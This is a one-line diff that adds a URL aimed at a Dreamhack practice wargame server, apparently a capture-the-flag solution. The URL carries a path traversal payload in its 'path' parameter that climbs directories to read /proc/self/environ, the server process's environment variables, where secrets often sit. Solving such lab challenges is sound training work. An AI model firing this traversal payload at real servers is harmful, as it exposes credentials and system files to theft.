@@ -1,0 +1,1 @@
+http://host3.dreamhack.games:23579/file?path=../../../../proc/self/environ
